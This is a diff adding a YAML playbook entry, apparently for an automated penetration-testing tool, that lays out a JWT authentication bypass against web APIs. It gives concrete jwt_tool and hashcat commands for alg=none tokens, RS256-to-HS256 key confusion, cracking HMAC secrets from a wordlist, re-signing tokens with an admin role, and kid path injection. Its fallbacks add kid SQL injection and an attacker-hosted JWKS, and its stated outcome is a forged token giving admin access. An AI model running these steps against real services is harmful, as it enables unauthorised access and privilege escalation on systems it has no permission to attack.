@@ -1,0 +1,51 @@
+id: auth_jwt_alg_none
+title: "JWT alg-confusion / weak-HMAC auth bypass"
+phase: exploit
+mitre: ["T1556", "T1212"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: ["jwt", "json web token", "bearer"]
+  cves:     ["CVE-2015-9235", "CVE-2018-1000531"]
+keywords:
+  - "jwt"
+  - "alg none"
+  - "alg=none"
+  - "kid injection"
+  - "weak hmac"
+  - "jwt brute force"
+  - "jwt_tool"
+  - "rs256 to hs256"
+preconditions:
+  - "Authorization: Bearer eyJ... header observed"
+  - "JWT decode shows alg field"
+steps:
+  - tool: curl
+    cmd:  "curl -s -H 'Authorization: Bearer {token}' {base_url}/api/me | jq ."
+    why:  "Baseline — confirm protected endpoint behaviour with valid token"
+  - tool: jwt_tool
+    cmd:  "jwt_tool {token}"
+    why:  "Decode header + payload, surface alg, kid, jku, x5u trust fields"
+  - tool: jwt_tool
+    cmd:  "jwt_tool {token} -X a"
+    why:  "alg=none variant — many libs accept it pre-2018"
+  - tool: jwt_tool
+    cmd:  "jwt_tool {token} -X k -pk public.pem"
+    why:  "RS256→HS256 confusion: sign with the public key as HMAC secret"
+  - tool: hashcat
+    cmd:  "hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt"
+    why:  "Crack HS256 secret when length is short / dictionary-derived"
+  - tool: jwt_tool
+    cmd:  "jwt_tool {token} -I -pc 'role' -pv 'admin'"
+    why:  "Re-sign with cracked secret elevating role/sub claim"
+  - tool: jwt_tool
+    cmd:  "jwt_tool {token} -X i -I -hc 'kid' -hv '../../dev/null' -S hs256 -p ''"
+    why:  "kid path injection — point to a known file/empty string for forged signature"
+expected_outcome: "Forged token with elevated claims accepted → admin-level API access"
+fallbacks:
+  - "If alg=none rejected and HS256 key uncrackable → check kid for SQLi (UNION SELECT)"
+  - "Look for jku/x5u — host attacker-controlled JWKS to impersonate signing key"
+  - "Check token reuse across users (no jti / no exp validation)"
+references:
+  - "https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens"
+  - "https://github.com/ticarpi/jwt_tool"
